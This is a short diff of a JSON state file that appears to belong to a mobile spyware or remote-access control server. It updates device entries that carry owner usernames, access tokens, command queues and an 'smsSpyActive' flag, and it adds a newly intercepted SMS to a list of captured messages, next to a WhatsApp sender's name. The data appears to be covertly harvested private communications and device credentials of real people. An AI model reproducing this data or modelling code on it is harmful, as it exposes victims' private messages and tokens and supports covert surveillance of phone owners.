@@ -4,7 +4,7 @@
     "deviceName": "HP-ABLO-F55F",
     "ownerUsername": "Zarr",
     "token": "7055f57f74cb7eef5034e3301d747b14",
-    "lastSeen": 1777784314414,
+    "lastSeen": 1777784356765,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T05:33:28.300Z",
@@ -4045,7 +4045,7 @@
     "deviceName": "HP-ABIR123-0330",
     "ownerUsername": "Fibersec",
     "token": "ab095dd2405dc78cf8aaa200b596d4bd",
-    "lastSeen": 1777784342903,
+    "lastSeen": 1777784364003,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-05-02T20:52:30.047Z",
@@ -4061,6 +4061,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Messages",
+        "sender": "99386",
+        "content": "Pulsa kamu tidak mencukupi untuk layanan ini. Yuk top up sekarang. Cek promo terbaru di *888*30#",
+        "time": "03/05 11:59",
+        "pkg": "com.google.android.apps.messaging",
+        "receivedAt": 1777784365451
+      },
       {
         "appName": "WhatsApp",
         "sender": "PP AZKHAL MUSTOFA CIKUDA",
